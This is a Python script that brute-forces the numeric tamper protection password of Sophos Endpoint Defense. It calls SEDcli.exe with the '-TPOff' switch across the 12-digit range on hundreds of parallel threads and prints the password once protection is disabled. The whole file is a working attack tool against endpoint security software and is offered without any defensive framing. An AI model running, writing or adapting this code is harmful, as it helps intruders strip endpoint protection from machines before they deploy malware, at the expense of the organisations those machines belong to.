import subprocess
import threading
import time
import datetime


#tpCode = 694575574884
rangeBottom = 0
rangeTop = 999999999999
rangeTop = 100000000000

passwordLength = 12

startTime = datetime.datetime.now()
endTime = None

counter = rangeBottom

found=False
endOfRange = False

maxThreads = 500

class sedCliPasswordCheck:
	thread = None
	SEDpassword = None
	exitCode = None
	
	def __init__(self,password):
		self.SEDpassword = str(password)
		self.thread = threading.Thread(target=self.sedCliDisable)
	

	def sedCliDisable(self):	
		op = None
		global found
		global startTime
		global endTime
		path = "C:\Program Files\Sophos\Endpoint Defense\SEDcli.exe"		
		exitCode = subprocess.call([path,"-TPOff",self.SEDpassword],stdin=None,stdout=op)			
		#print(exitCode)
		if exitCode == 0:
			found = True
			endTime = datetime.datetime.now()
			print("*****************************************************")
			print("*****************************************************")
			print("Tamper Protection Password Was:   " + self.SEDpassword)
			print("Start Time:   " + startTime)
			print("End Time:   " + endTime)
			print("*****************************************************")
			print("*****************************************************")
			
		return exitCode

threadTracker = []

pwdRange = range(100000000000, 1000000000000)

for pwd in pwdRange:	
		if len(str(pwd)) < passwordLength:
			pwd = "00000000000" + str(pwd)
			pwd = pwd[(len(pwd)-passwordLength):]
			
		if len(threadTracker) > maxThreads:
			for tt in threadTracker:
				if tt.thread.isAlive() == False:					
					threadTracker.remove(tt)
			time.sleep(3)
		if found == False:
			t = sedCliPasswordCheck(str(pwd))
			print("Checking Password:   " + t.SEDpassword)
			t.thread.start()
			threadTracker.append(t)

pwdRange = range(0, 100000000000)

for pwd in pwdRange:	
		if len(str(pwd)) < passwordLength:
			pwd = "00000000000" + str(pwd)
			pwd = pwd[(len(pwd)-passwordLength):]
			
		if len(threadTracker) > maxThreads:
			for tt in threadTracker:
				if tt.thread.isAlive() == False:					
					threadTracker.remove(tt)
			time.sleep(3)
		if found == False:
			t = sedCliPasswordCheck(str(pwd))
			print("Checking Password:   " + t.SEDpassword)
			t.thread.start()
			threadTracker.append(t)			
		
	

	





